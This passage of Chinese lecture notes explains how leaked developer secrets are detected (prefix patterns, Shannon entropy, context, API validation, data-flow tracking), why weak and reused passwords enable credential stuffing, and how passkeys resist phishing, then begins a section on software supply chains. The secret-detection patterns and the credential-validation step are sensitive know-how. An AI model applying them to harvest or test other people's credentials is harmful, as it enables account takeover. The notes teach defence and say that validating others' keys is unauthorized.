| **基于模式**（pattern-based） | 已知的格式或前缀 | `ghp_xxxxxxxx...`，被 GitHub token 的模式匹配到 |
| **基于熵**（entropy-based） | 看起来随机、熵很高的字符串 | `8fK2xP9mQ4vL7sR1...`，因为随机性高而被发现 |
| **上下文感知**（context-aware） | 周围的代码或语义 | `api_key = "xxxxxxxx..."`，因为变量名叫 `api_key` 而被标记 |
| **基于验证**（validation-based） | 候选凭据能不能真的用 | 拿一个疑似 GitHub token 去调 API，返回 `200 OK` |

**基于模式**最直接。很多服务的密钥有固定的前缀和长度：GitHub 的个人访问令牌以 `ghp_` 开头，AWS 的访问密钥 ID 以 `AKIA` 开头，Stripe 是 `sk_live_`。讲师举的例子是 OpenAI 的 API key：以固定的前缀开头、长度固定，用这个模式就能在源代码里搜出来。它的好处是准确，误报少；局限是只能找**已知格式**的秘密，自己公司内部生成的随机口令，它就无从下手。

**基于熵**利用的是讲师指出的一个有趣事实：**开发者用的密钥通常是随机生成的，也就是熵很高**，所以可以去找熵特别高的字符串。这里的熵指 **Shannon 熵**（Shannon entropy），衡量一个字符串里字符的"混乱程度"：

$$
H(s) = -\sum_{c} p_c \log_2 p_c
$$

其中 $p_c$ 是字符 $c$ 在字符串 $s$ 里出现的比例，求和遍历 $s$ 里出现过的每一种字符，单位是"比特/字符"。读出来就是：**平均每个字符带来多少比特的不确定性**。所有字符都一样时，$H = 0$；所有字符都不一样时，$H$ 达到最大值 $\log_2(\text{长度})$。

> **🔑 例：算三个字符串的熵** —
>
> - `aaaaaaaaaaaaaaaa`：只有一种字符，$p_a = 1$，$H = -1 \cdot \log_2 1 = 0$。
> - `password123`：11 个字符，`s` 出现 2 次，其余 9 种各出现 1 次。
>   $H = -\left[\tfrac{2}{11}\log_2\tfrac{2}{11} + 9 \times \tfrac{1}{11}\log_2\tfrac{1}{11}\right] = \tfrac{2}{11}\times 2.46 + \tfrac{9}{11}\times 3.46 \approx 0.45 + 2.83 = 3.28$ 比特/字符。
> - `8fK2xP9mQ4vL7sR1`：16 个字符互不相同，每个 $p = \tfrac{1}{16}$，$H = \log_2 16 = 4.00$，正好是 16 个字符能达到的上限。
>
> 第三个例子说明了一个容易忽略的事实：**字符串越短，熵的上限越低**。16 个字符最多 4 比特/字符，无论多随机都超不过。所以熵检测工具通常只看长度超过某个值（比如 20 个字符）的字符串。

课上有同学问：检查整个代码库里每个字符串的随机性，不会很慢吗？讲师说不用担心，下一讲会介绍能在几分钟内扫完全部源代码的自动化方法；Python 里也有现成的函数，把字符串传进去就能算熵。主讲老师补充说，已经有现成的代码能检测熵，一般要求 API key 的熵非常高。

熵检测的问题在于，**高熵不等于秘密，秘密也不一定高熵**。图 6 算了十个字符串的熵，并画了一条示意的阈值线。

```plot 图 6 · 十个字符串的 Shannon 熵（比特/字符）。橙色是真正的秘密，灰色不是；绿色虚线是一条示意的检测阈值。阈值以上的三个秘密被找到了，可同样越过阈值的 base64 片段是误报；阈值以下，弱口令 password123 和 AWS 的 key ID 被漏掉了
import math, random, string, hashlib, base64
from collections import Counter
def H(s):
    n = len(s)
    return -sum(v / n * math.log2(v / n) for v in Counter(s).values()) + 0.0
rnd = random.Random(9)
alnum = string.ascii_letters + string.digits
k8 = "8fK2xP9mQ4vL7sR1" + "".join(rnd.choice(alnum) for _ in range(24))
ghp = "ghp_" + "".join(rnd.choice(alnum) for _ in range(36))
b64 = base64.b64encode(bytes(rnd.randrange(256) for _ in range(30))).decode()
items = [
    ("aaaaaaaaaaaaaaaa", "aaaaaaaaaaaaaaaa", False),
    ("api_key（变量名）", "api_key", False),
    ("password123（弱口令）", "password123", True),
    ("AKIAIOSFODNN7EXAMPLE（AWS key ID）", "AKIAIOSFODNN7EXAMPLE", True),
    ("sha256 校验和（64 位十六进制）", hashlib.sha256(b"app.tar.gz").hexdigest(), False),
    ("https://api.github.com/user", "https://api.github.com/user", False),
    ("AWS secret key（40 位）", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", True),
    ("图片的 base64 片段（40 位）", b64, False),
    ("ghp_…（GitHub token，40 位）", ghp, True),
    ("8fK2xP9mQ4vL7sR1…（40 位）", k8, True),
]
items.sort(key=lambda it: H(it[1]))
names = [it[0] for it in items]
vals = [H(it[1]) for it in items]
cols = ["C2" if it[2] else "C3" for it in items]
fig = plt.figure(figsize=(7.2, 4.4))
plt.barh(range(len(items)), vals, color=cols)
plt.yticks(range(len(items)), names, fontsize=9)
plt.axvline(4.5, color="C0", ls="--", lw=1.5)
plt.text(4.45, -0.9, "示意阈值 4.5", color="C0", ha="right", fontsize=9)
for i, (name, s, secret) in enumerate(items):
    plt.text(vals[i] + 0.05, i, f"{vals[i]:.2f}", va="center", fontsize=8)
    if secret and vals[i] < 4.5:
        plt.text(5.15, i, "漏报", va="center", color="C2", fontsize=9)
    if not secret and vals[i] >= 4.5:
        plt.text(5.15, i, "误报", va="center", color="C3", fontsize=9)
plt.xlim(0, 5.6)
plt.ylim(-1.3, len(items) - 0.4)
plt.xlabel("Shannon 熵 H（比特/字符）")
```

图 6 里看三件事。第一，**漏报**：`password123` 是一个真正的秘密（某个系统的口令），熵却只有 3.28，和变量名 `api_key` 差不多；AWS 的访问密钥 ID 只用大写字母和数字、又只有 20 位，也只有 3.68。第二，**误报**：一段图片的 base64 编码和真正的密钥一样随机，熵越过了阈值，可它不是秘密；哈希值、UUID、压缩数据都有这个问题。第三，阈值怎么定都两难：调低能少漏几个，误报就会更多。所以实际的工具都是**组合**着用：`AKIA` 这种前缀交给模式匹配，`password123` 这种靠上下文（它被赋值给了一个叫 `db_password` 的变量），熵用来兜底那些格式未知的随机密钥。

**上下文感知**看的是字符串周围的东西：一个字符串既没有特殊前缀、也不够随机，可它被赋值给了一个叫 `api_key` 的变量，或者出现在 `.env` 文件里，那它多半就是秘密。

**基于验证**是最后一步，也最可靠。讲师说：手里有一个疑似 OpenAI 的 key，不知道是真是假，就拿它发一个 API 请求；OpenAI 返回了正常的结果，就说明它是有效的。说得更一般些，就是发一个 HTTP 请求，看返回码：`200 OK` 说明凭据有效，`401` 或 `403` 说明无效或没有权限。验证把"看起来像秘密"变成了"确认是一个还能用的秘密"，误报几乎为零，也能帮你先处理最危险的那些。

> 📎 **拓展(超出 slides)：验证要有授权** — 拿一把**别人**泄露的凭据去调用服务，即使只是为了"验证"，在很多司法辖区也属于未经授权的访问。TruffleHog 这类工具的验证功能，是给你扫描**自己的**代码和仓库用的。

### 5.7 进阶：看秘密被拿去做什么 (S51)

前四种技术都在看秘密"长什么样"。S51 换了一个角度，看秘密"被用来做什么"。它的推理有三步：

1. **秘密密钥的用途是什么？** 用来访问敏感的服务或数据。
2. ⇒ **它经常被用来连接一个 HTTP 服务、发出请求。**
3. ⇒ **所以，我们可以分析代码里发 HTTP 请求的调用，来找出可能泄露的秘密密钥。**

S51 的例子专门设计得让前四种技术都失效：

```javascript
const prefix = "password";
const suffix = "user-admin";
const token = `${prefix}${suffix}`;

fetch("https://api.github.com/user", {
  headers: {
    "Authorization": `Bearer ${token}` // Value in the Authorization header is likely a secret.
  }
});
```

逐一检查。代码里出现的两个字符串字面量是 `"password"` 和 `"user-admin"`，单独看都是普通单词：没有特殊前缀，模式匹配找不到；熵分别只有 2.75 和 3.32 左右，熵检测找不到；变量名 `prefix`、`suffix` 毫无可疑之处，上下文也很弱。可是顺着数据往下走：这两个字符串被拼成了 `token`，`token` 又被放进了 HTTP 请求的 **Authorization 请求头**，前面还带着 `Bearer`，也就是第 4 周 §2.7 讲的**持有者令牌**。一个值最终流进了 Authorization 请求头，它几乎一定是凭据。

所以 S51 的方法不是看某一个字符串，而是**追踪数据在程序里怎样流动**：从"可疑的来源"（代码里的字符串常量）一路追到"敏感的去处"（发出去的 HTTP 请求的认证头）。讲师说，这种对整个程序的静态分析留到下一讲，它能在几分钟之内找出这类秘密。第 10 周的讲座正是拿这个例子开场，引出了"source → sink"的污点分析（taint analysis）。

> 📎 **拓展(超出 slides)：熵的数字** — 按 §5.6 的公式，`password`（8 个字符，`s` 出现两次）的熵约 2.75 比特/字符，`user-admin` 约 3.32，拼起来的 `passworduser-admin` 约 3.57，都远低于图 6 的示意阈值。这说明把一个秘密拆成几段普通的字符串，就足以躲过单看字符串的检测。

<details>
<summary>自测：一位队友把含有 AWS 密钥的 .env 文件提交并推送了，十分钟后发现，提交了一个删除 .env 的新 commit，还用 force push 改写了远端的历史。现在安全了吗？还应该做什么？</summary>

不安全。十分钟足够自动扫描器发现它（S49：几分钟之内就会被发现和利用），也足够别人 clone 或 fork 仓库；改写历史收不回这些副本。删除和改写历史都是在处理代码，真正要处理的是秘密本身：立刻到 AWS 停用并轮换这把密钥，查看它在泄露后有没有被使用，然后把密钥改成运行时从环境注入，给仓库加上 pre-commit 和 CI 的秘密扫描（S49）。

</details>

<details>
<summary>自测：下面四个秘密，各自最可能被 S50、S51 的哪种技术发现？(a) 测试文件里的 ghp_ 开头的 token；(b) db_password = "Summer2024!"；(c) 一个叫 x 的 JSON 字段里存着 40 位随机字符；(d) 由两个普通字符串拼成、再放进 Authorization 请求头的 token。</summary>

(a) 基于模式：ghp_ 是 GitHub token 的固定前缀。(b) 上下文感知：字符串本身不够随机、也没有前缀，但变量名 db_password 暴露了它。(c) 基于熵：没有前缀、变量名也没有意义，只有随机性这一个线索；40 位足够长，熵能超过阈值。(d) S51 的数据流分析：每一段字符串都很普通，只有追踪到它流进了 Authorization 请求头，才看得出它是凭据。四种情况找到之后，都可以再用基于验证的方法确认它是否仍然有效。

</details>

<details>
<summary>自测：计算字符串 aabb 和 abcd 的 Shannon 熵。哪个更像随机生成的密钥？</summary>

aabb：两种字符各占一半，$H = -2 \times (0.5 \log_2 0.5) = 1$ 比特/字符。abcd：四种字符各占 1/4，$H = \log_2 4 = 2$ 比特/字符，是 4 个字符能达到的上限。abcd 的熵更高，但两个都太短，任何 4 个字符的字符串熵都不会超过 2，所以实际工具根本不会去看这么短的字符串。

</details>

## 6. 秘密安全（二）：用户手里的口令与 passkey

讲师说，开发者用的秘密是一个故事，用户用的秘密是另一个故事。开发者的密钥是随机生成的，熵很高；**用户更喜欢低熵的口令**，因为要记得住。

### 6.1 口令：低熵、被泄露、被重用 (S52)

S52 说：**研究表明，很多泄露出来的口令仍然简单、好猜**。它列出了最常见的被盗口令：

| 排名 | 口令 | 出现次数 |
|---|---|---|
| 1 | 123456 | 7,618,192 |
| 2 | 12345678 | 3,676,487 |
| 3 | 123456789 | 2,866,100 |
| 4 | admin | 1,987,808 |
| 5 | 1234 | 1,771,335 |
| 6 | Aa123456 | 1,411,847 |
| 7 | 12345 | 1,301,052 |
| 8 | password | 1,082,010 |
| 9 | 123 | 959,741 |
| 10 | 1234567890 | 674,200 |

前十名加起来约 2335 万次。第 4 名 `admin` 让人想起 §4.2 的默认口令，第 6 名 `Aa123456` 是为了满足"必须有大写字母"的规则凑出来的，规则没让它变得更难猜。

讲师问了一个好问题：**这些数字是怎么来的？** 你不会把自己的口令告诉研究人员。答案是**数据库泄露**：有些公司的用户数据库被攻击者拿走、公开（讲师提到了 Facebook 和一些银行的事件），研究人员统计的就是这些泄露出来的数据库。S52 右边是一份泄露的样子：

```text
email: alice@example.com
password: password123

email: bob@example.com
password: 123456
```

S52 列出了这件事的三个后果：**弱口令容易被猜中；泄露的口令让用户账号暴露；被重用的口令让攻击者能攻击其他服务**。S52 的结论是：**用户重用口令时，一次数据库泄露的危险会成倍放大**。

> 📎 **拓展(超出 slides)：这份泄露错在两个地方** — 第一，用户选了弱口令。第二，**服务器把口令明文存着**，泄露出去直接就能用。第 6 周 §2.3–§2.4 讲过，服务器应该只存口令的加盐哈希，最好用专门放慢计算的哈希函数；这样数据库泄露后，攻击者还得一个个去猜。不过，加盐哈希对 `123456` 这样的弱口令帮助有限，字典里的第一个词就能猜中；对口令重用，它更是无能为力：只要攻击者猜出了 Alice 在这个网站的口令，就能拿去试她的其他账号。这正是下一节的问题。

### 6.2 撞库：拿一个网站的泄露去试别的网站 (S53)

S53 说：**攻击者可能拿泄露的用户名–口令组合，去别的服务上尝试**。这叫**撞库**（credential stuffing）。S53 的图里，一组泄露的凭据（`alice@example.com` / `password123`）被拿去试购物网站、云服务和邮箱，任何一个登录成功，就是一次**账号接管**（account takeover）。S53 给出的解释是：**撞库之所以有效，是因为用户经常在多个服务上重用同一个口令**。防御措施是：**唯一的口令、口令管理器、多因素认证（MFA）、限速、可疑登录检测**。

讲师逐一解释了这些防御。最朴素的办法是每个服务用不同的口令，讲师半开玩笑地说这"不可能"，没人记得住，自己也是同一个口令到处用；口令管理器正是为解决这个问题而生的，它替你记住每个网站一个随机口令。其次是**多因素认证**，比如短信验证码、Gmail 发来的验证码：攻击者手里只有口令，没有你的手机，还是登不进去。再次，攻击者通常会以很高的频率尝试登录，所以要**监控请求速率**；遇到可疑的登录尝试（新设备、陌生地区），就要提高警惕。

撞库常和另外两种口令攻击混淆。三者的区别在于攻击者手里有什么、拿它去试什么，这也决定了哪种防御有效：

| 攻击 | 攻击者手里有什么 | 怎样尝试 | 按账号限速有没有用 |
|---|---|---|---|
| **暴力破解**（brute force） | 一个目标账号 | 对这个账号试大量口令 | 有用：同一个账号很快被锁 |
| **口令喷洒**（password spraying，📎） | 一份常见口令表（如 S52 的前十名） | 对大量账号各试几个最常见的口令 | 基本没用：每个账号只试一两次 |
| **撞库**（credential stuffing，S53） | 别的网站泄露的"用户名 + 口令" | 每个账号只试一次，用的就是它自己的口令 | 没用：每个账号只试一次，而且往往一试就中 |

所以 S53 的防御清单里，限速只是其中一项，MFA 和可疑登录检测才是对付撞库的主力。更彻底的办法，是让"口令"这个东西不再存在。

> **🔑 例：撞库的数学** — 假设某论坛泄露了 100 万组邮箱和口令（数字为示意）。攻击者把它们拿到一个购物网站上逐一尝试，只要其中 2% 的用户在两个网站用了同一个口令，就有 2 万个账号被接管，**一个口令都不用猜**。如果被接管的是邮箱账号，后果更大：几乎所有网站的"忘记密码"都把重置链接发到邮箱，拿下邮箱，就能接着拿下其他账号。

### 6.3 passkey：用一对密钥代替口令 (S54, S55)

讲师接着说：既然口令不安全，常在多个服务间重用，容易被钓鱼，数据库泄露时又会被盗，于是有了 **passkey**。S54 把两者并排比较：

| 口令 Password（S54） | Passkey（S54） |
|---|---|
| 在多个服务间重用 | 基于**公钥密码学** |
| 容易被钓鱼 | **私钥从不离开设备** |
| 会在数据泄露中被盗 | **抗钓鱼**（phishing resistant） |
| 往往弱、好猜 | 不需要记任何口令 |

S54 的核心思想是：**passkey 用一对密钥代替口令。私钥安全地保存在用户的设备上，服务只登记公钥**。

S55 写出了登录时的三步：

1. **服务器**：`Challenge = Random()`，生成一个随机的挑战；
2. **设备**：`Signature = Sign(PrivateKey, Challenge)`，用私钥对挑战签名；
3. **服务器**：`Verify(PublicKey, Challenge, Signature)`，用登记过的公钥验证签名。

S55 的结论是：**passkey 用数字签名来证明用户持有对应的私钥**。讲师以 GitHub 为例描述了全过程：私钥存在用户的设备里，注册时设备只把公钥交给 GitHub（录音里一处口误说成了"上传私钥"，S54 写得很清楚，登记的是公钥）；登录时 GitHub 发来一个随机数作为挑战，设备用私钥签名，把签名发回；GitHub 用手里的公钥验证这个签名是不是对这个挑战的、是不是真正的用户发来的。整个过程里，**私钥从来没有离开过设备**。图 7 画出了注册和登录两个阶段。

```d2 图 7 · passkey 的注册与登录（S54、S55）：注册时只有公钥离开设备；登录时服务器出一个随机挑战，设备在本地解锁私钥、签名，服务器用公钥验证。浏览器把"是哪个网站在请求"一起交给设备，§6.4 会用到这一点
shape: sequence_diagram
dev: "用户设备（认证器）"
br: "浏览器"
srv: "服务器 github.com"
reg: "注册" {
  dev -> dev: "生成一对密钥，私钥留在设备里"
  dev -> srv: "只上传公钥"
}
login: "登录" {
  srv -> br: "随机挑战 Challenge = Random()"
  br -> dev: "挑战 + 请求来源 github.com"
  dev -> dev: "指纹、面容或 PIN 解锁私钥"
  dev -> srv: "Sign(私钥, 挑战与来源)"
  srv -> srv: "Verify(公钥, 挑战, 签名)"
}
```

课上一位同学问：这和 RSA 一样吗？讲师说底层可以是 RSA，但这里用的是**签名**，而不是加密，流程更简单。主讲老师接过话头，把流程又讲了一遍：我是服务器，我给你一个随机数，我手里已经有你的公钥；你把这个随机数当成一条消息，用你的私钥签名（比如用基于椭圆曲线的签名算法），把签名发回给我；我用你的公钥验证，验证通过，就让你登录。主讲老师最后说：**这就是两周前讲过的识别方案中的一个**。

这句话指的是第 6 周 §2.9 的**协议 9：基于签名的识别**（Signature Based ID）：Bob 发一个随机数 $r$，Alice 用私钥对 $r$ 签名，Bob 用公钥验证。passkey 就是协议 9 在 Web 上的标准化实现，只是多加了两样东西：

| | 第 6 周协议 9 | passkey |
|---|---|---|
| 挑战 | Bob 选的随机数 $r$ | 服务器生成的随机挑战 |
| 应答 | Alice 用私钥对 $r$ 签名 | 设备用私钥对挑战签名 |
| 服务器存什么 | Alice 的公钥 | 用户的公钥 |
| 多出来的 1 | — | 签名的内容里包含**请求来源**（哪个网站），防钓鱼（§6.4） |
| 多出来的 2 | — | 私钥要先用指纹、面容或 PIN 在**设备本地**解锁 |

第 6 周的分析可以直接搬过来，解释 passkey 为什么比口令安全：

- **服务器只存公钥**。第 6 周老师说协议 8、9 好在"黑客攻破服务器，拿到的也只是你的公钥"。对照 §6.1：数据库泄露出来的是一堆公钥，攻击者拿去毫无用处。
- **每个网站一对独立的密钥**。不存在"同一个口令到处用"，§6.2 的撞库无从谈起。
- **挑战每次都是新的随机数**。截获一次签名也没用，下次的挑战不一样，重放不成立。
- **没有可以输入的东西**。用户根本不知道私钥是什么，钓鱼网站也就骗不到它，这是下一节的内容。

> 📎 **拓展(超出 slides)：passkey 的标准和生物特征** — passkey 背后的标准是 FIDO 联盟的 FIDO2 和 W3C 的 WebAuthn。你用 Face ID 或指纹登录时，生物特征**只在设备本地**用来解锁私钥，从不发给服务器；服务器收到的只有签名。所以即使网站被攻破，你的指纹也不会泄露。

### 6.4 passkey 为什么能防钓鱼 (S56)

S56 用同一个钓鱼场景比较了两种认证。**钓鱼**（phishing）是指攻击者做一个以假乱真的网站，骗用户在上面输入凭据。讲师的设定是：你点开了一个假的 GitHub 登录页面，它的地址也许是 `github-login.example.com`，可你没有察觉。

- **口令认证**：你在假页面上输入口令，口令直接到了攻击者手里，攻击者拿它登录真正的 `github.com`。S56 写的是：**口令被偷了**（*Password is stolen*）。
- **passkey 认证**：假页面发起认证请求，你的设备**核对来源**：这是 `github.com` 吗？不是，是 `github-login.example.com`。**认证被拒绝**（*Authentication Refused*）。

讲师的说法是：没有计算机背景的人，很难看出页面是假的，输入口令就等于把账号交给了攻击者；passkey 则由设备来检查请求是不是真的来自 `github.com`，不是就拒绝。S56 没有展开"设备怎样核对来源"，下面补上它的机制。

> 📎 **拓展(超出 slides)：设备凭什么知道来源** — 注册时，passkey 就和网站的域名绑定在了一起（WebAuthn 把这个域名叫作 relying party ID，比如 `github.com`）。登录时，网站地址不是由用户、也不是由网页自己报告的，而是由**浏览器**交给设备，并且被写进签名的内容里。于是：(1) 假网站 `github-login.example.com` 发起请求时，设备里根本没有属于这个域名的 passkey，它连 `github.com` 那把钥匙都调不出来；(2) 即使假网站把真 `github.com` 发来的挑战转交过来，设备签名时写进去的来源也是假网站的地址，真 `github.com` 验证时发现来源不对，同样拒绝。判断"是不是真网站"的，是软件对两个字符串的比较，而不是人眼对网址的辨认。这也是 passkey 比短信验证码强的地方：验证码是一串用户可以抄下来、输进任何页面的数字，一个实时转发的钓鱼网站照样能骗走它。

图 8 把两条路并排画了出来。

```d2 图 8 · 同一个钓鱼页面，两种结局（S56）：口令由人输入，人分不清真假网站，口令就到了攻击者手里；passkey 由设备核对来源，来源对不上就不签名
direction: down
pw: "口令登录" {
  f1: "假页面\ngithub-login.example.com" {class: warn}
  u1: "用户看不出真假\n输入口令"
  a1: "攻击者拿口令\n登录真的 github.com" {class: warn}
  f1 -> u1 -> a1
}
pk: "passkey 登录" {
  f2: "假页面\ngithub-login.example.com" {class: warn}
  br: "浏览器报告真实来源"
  d: "设备：这把 passkey\n只属于 github.com" {class: key}
  r: "拒绝，不签名" {class: good}
  f2 -> br -> d -> r
}
```

这个机制也有边界（📎）：passkey 防得住钓鱼，防不住设备上已经装了恶意软件，也防不住"账号恢复"这条后路。如果一个网站允许你在丢了设备时用短信验证码重置登录方式，攻击者就会转而攻击这条更弱的路。

### 6.5 多设备同步 (S57, S58)

既然私钥从不离开设备，那换了一台设备怎么办？讲师说很简单：passkey 支持**多设备同步**。S57 的流程是：在 iPhone 上**创建 passkey** → **端到端加密的同步**（通过 iCloud 钥匙串或 Google 密码管理器）→ MacBook 上**这个 passkey 也能用了**。S57 的四个要点：

- **passkey 在同步之前先经过端到端加密**；
- **云服务商只保存加密后的数据，访问不到私钥**；
- **每一台受信任的设备都收到一份自己的本地副本**；
- **用户可以在任何一台受信任的设备上认证，不需要再创建新的 passkey**。

讲师的描述是：iPhone 先把 passkey 加密，再传给云端（比如 Google 或 Apple 的服务器），云端把这份密文发给 MacBook，在 MacBook 上解密；整个过程里，服务器上不保存任何关于私钥的信息，所有私钥都只存在你自己的设备上。

S58 接着展示了同步之后怎样登录：GitHub 那边登记着**一把公钥**；iPhone 和 MacBook 上各有一份私钥的本地副本。认证过程是：(1) 服务器发来一个随机挑战；(2) 用户选择一台受信任的设备；(3) 这台设备**在本地**用私钥签名；(4) GitHub 用登记的公钥验证签名。S58 的结论是：**任何一台受信任的设备，都能用自己那份私钥副本独立完成认证**。图 9 把 S57 和 S58 合在一起画了出来。

```d2 图 9 · 多设备 passkey（S57、S58）：私钥以端到端加密的形式经云端同步，云端只见过密文；两台设备持有同一把私钥的副本，GitHub 只登记一把公钥，哪台设备签名它都认
direction: down
ip: "iPhone\n私钥副本"
cloud: "iCloud 钥匙串 / Google 密码管理器\n只存密文，看不到私钥"
mb: "MacBook\n私钥副本"
gh: "GitHub\n登记着一把公钥" {class: key}
ip -> cloud: "端到端加密后上传"
cloud -> mb: "密文，到设备上才解密"
ip -> gh: "在本地签名挑战"
mb -> gh: "在本地签名挑战"
```

这里要标出一个容易混淆的地方。S54 说"私钥从不离开设备"，S57 却说 passkey 会同步到别的设备，两句话矛盾吗？更准确的说法是：**私钥从不以明文离开你信任的设备**。同步时它确实离开了 iPhone，但离开时已经加密，只有你的另一台设备能解开，云服务商看到的只是密文。这就是第 4 周 §6.2 的**端到端加密**：把服务器移出明文的路径。

> 📎 **拓展(超出 slides)：同步的 passkey 和绑定设备的 passkey** — 存在硬件安全密钥（比如 YubiKey）里的 passkey，私钥真的从不离开那块芯片，也不能同步。S57 讲的是另一种：存在手机、电脑里，随云账号同步。前者更严格，后者更方便。用同步的 passkey，安全的重心就转到了那个云账号上：iCloud 或 Google 账号本身要用强认证保护好，因为它控制着同步到新设备这一步。

### 6.6 为什么要支持多设备 (S59)

S59 的标题是**易用性和可恢复性**（Usability and Recoverability）。它的配图对比了两种情况：

| 没有多设备 passkey | 有多设备 passkey（同步） |
|---|---|
| 每台设备单独创建一个 passkey（iPhone、MacBook、iPad、Windows 笔记本各一个） | 只创建一个 passkey，安全地同步到受信任的设备 |
| 每换一台设备都要重新注册 | 经平台加密同步（如 iCloud 钥匙串、Google 密码管理器） |
| 服务器上要管理很多个 passkey，更麻烦 | 服务器上只有一把公钥 |
| 设备丢了或坏了，就有失去访问权的风险 | 丢一台设备不会把你锁在门外 |

S59 下方列出了多设备 passkey 的四个好处：**避免单点故障**（丢一台设备不会把你锁在账号外面）；**无缝的跨设备体验**（在任何一台受信任的设备上登录）；**不用重复注册**（创建一次，所有受信任的设备都能用）；**更容易推广**（好恢复、用起来方便，就像口令一样）。

讲师的解释是：如果不支持多设备，只有两种情况。要么每台设备都创建一个新的 passkey，因为私钥离不开设备；要么只在一台设备上创建一个，可一旦丢了这台设备，你就再也登不进账号，因为私钥跟着丢了，**就像比特币一样**。这正是第 3 周的教训：私钥就是权力，丢了私钥就丢了币，所以钱包要用助记词做备份（第 3 周 §3.9）。多设备同步是 passkey 的"助记词"：它用加密的同步，换来了丢一台设备也能恢复的能力。讲师说，有了这个特性，passkey 用起来就和口令一样方便，可以在不同设备上登录同一个账号，安全性却比口令高得多。

<details>
<summary>自测：一个只支持 passkey 登录的网站，用户数据库被整个偷走了。攻击者能不能用这些数据去其他网站撞库？为什么？</summary>

不能。passkey 网站的数据库里存的只是每个用户的公钥（S54：服务只登记公钥）。公钥本来就是公开的，拿它算不出私钥，也没法用它通过任何网站的挑战（挑战要用私钥签名才能通过）。而且每个网站一对独立的密钥，就算有口令那样的"共同秘密"也不存在可以重用的东西，撞库的前提（同一个凭据在多个服务上通用）根本不成立。这和第 6 周协议 9 的分析相同：服务器被攻破，拿到的也只是公钥。

</details>

<details>
<summary>自测：攻击者在 github-login.example.com 上做了一个和 GitHub 一模一样的登录页。分别说出用户用口令和用 passkey 时会发生什么。</summary>

用口令：用户看不出真假，在假页面上输入口令，口令直接到了攻击者手里，攻击者拿它登录真的 github.com（S56 左栏）。如果用户还开了短信验证码，实时转发的钓鱼页面也能把验证码一并骗走。用 passkey：浏览器把真实来源 github-login.example.com 交给设备，设备里属于 github.com 的 passkey 和这个来源对不上，不签名，认证被拒绝（S56 右栏）；即使攻击者把真 GitHub 的挑战转过来，签名里写的来源也不对，真 GitHub 会拒绝。

</details>

<details>
<summary>自测：把 passkey 的登录过程和第 6 周的协议 9 对照，指出相同之处和 passkey 多出来的两样东西。</summary>

相同：都是挑战–应答，验证方发一个新的随机数，证明方用私钥签名，验证方用登记的公钥验证；服务器只存公钥，重放不成立。passkey 多出来的：一，签名内容里包含请求来源（网站域名），并且 passkey 和域名绑定，这让它能防钓鱼（S56）；二，私钥要先在设备本地用指纹、面容或 PIN 解锁，生物特征不离开设备。

</details>

## 7. 软件供应链

前几节一直在讲"别人的代码"：第三方 Action（§3.6）、npm install 装进来的依赖（§2.4）、部署的开源服务（§4）。最后一部分把它们放进一个统一的概念里：软件供应链。

### 7.1 代码复用：现代软件是"拼"出来的 (S61)

S61 的第一句话是：**现代的开源软件很少从零写起。大多数项目是靠复用库、包、代码片段和传递依赖拼起来的**。它给出了四个数字：

- **97% 被审计的代码库含有开源组件**（S6 写的是 98%，两处数字略有出入，考试按各自的 slide 记即可）；
- **一个应用平均含有 911 个开源组件**；
- **被扫描的代码里，70% 来自开源**；
- **64% 的开源组件是传递依赖**（transitive dependencies）。

讲师用 S61 右边的代码说明复用带来的效率：

```python
import tensorflow as tf

model = tf.keras.Sequential([
    tf.keras.layers.Dense(64, activation="relu"),
    tf.keras.layers.Dense(10)
])

model.compile(
    optimizer="adam",
    loss="sparse_categorical_crossentropy"
)
```

十一行代码就搭出了一个小型神经网络：定义模型、激活函数用 ReLU、两个全连接层、指定优化器和损失函数。讲师说，要是从零写起，也许得花两年。S61 底部画了一条链：**我们的代码 → TensorFlow → 其他库 → 系统**。

最后一个数字最值得注意。**直接依赖**（direct dependency）是你自己选的、写在 `requirements.txt` 或 `package.json` 里的包；**传递依赖**（也叫间接依赖）是你的依赖又依赖的包。讲师的解释是：你只知道自己用了 TensorFlow，却不知道 TensorFlow 也在复用别的库，那些库就是传递依赖。S61 说，64% 的组件属于这一类，也就是说，**你的软件里大多数开源组件，不是你选的**。图 10 用 TensorFlow 和 Flask 举了一个例子。

```d2 图 10 · 直接依赖和传递依赖（以 S61 的 TensorFlow 为例，再加一个 Flask）：依赖清单里只写了两行，装进来的却远不止两个包，这里只画出了一小部分。S61 说，64% 的开源组件是这样"跟着进来"的
direction: down
app: "我们的代码" {class: key}
direct: "直接依赖：自己选的" {
  tf: tensorflow
  fl: flask
}
trans: "传递依赖：跟着进来的" {
  np: numpy
  pb: protobuf
  tb: tensorboard
  wz: werkzeug
  jj: jinja2
  ms: markupsafe
}
app -> direct.tf
app -> direct.fl
direct.tf -> trans.np
direct.tf -> trans.pb
direct.tf -> trans.tb
direct.fl -> trans.wz
direct.fl -> trans.jj
trans.jj -> trans.ms
```

图 10 里有一个和前面呼应的细节：`werkzeug` 是 Flask 的传递依赖，而 §4.3 那个危险的交互式调试器，正是由它提供的。你写 `pip install flask` 的时候，并没有选择 Werkzeug，可它的行为决定了你的生产环境有多安全。

### 7.2 复用代码，也复用风险 (S62)

S62 说：**复用现成的代码时，我们也可能继承它的 bug、漏洞、假设和维护负担**。它画了两条平行的链：开源库 → 代码复用 → 我们的应用；对应的是 已有的漏洞 → 继承的风险 → 更大的攻击面。讲师说，用别人的代码，享受了它的功能和便利，同时也继承了它的漏洞：你用的开源库有漏洞，你的应用也就有漏洞。

S62 区分了两种复用：

- **直接复用**（direct reuse）：我们的代码 → 原样使用的库。直接用现成的包，不做修改。讲师的例子是 `import` TensorFlow。
- **定制复用**（customized reuse）：开源代码 → 修改过的版本。fork 或复制代码，再按本地环境改写。讲师的例子是：你在 Stack Overflow 上看到一个回答，或者 AI 给了你一段代码，发现有点问题，改一改，复制粘贴进自己的项目。讲师提醒，**修改现有代码时，你也可能引入新的漏洞**，而你自己并不知道。

S62 底部的问题是整个 §7 的出发点：**我们依赖了哪些外部代码？继承了哪些风险？**

S62 列出的四样"继承物"值得逐一想清楚。**bug 和漏洞**最直观。**假设**（assumptions）更隐蔽：一个库在设计时可能假定输入是可信的，你却把攻击者能控制的数据交给了它，§7.5 的 Log4j 就是这样。**维护负担**（maintenance burden）是说：你依赖的包也需要有人持续修补，而它的维护者可能只是一个没有报酬的志愿者，哪天不维护了，或者把项目交给了陌生人（§7.10、§7.11），风险就一并转给了你。

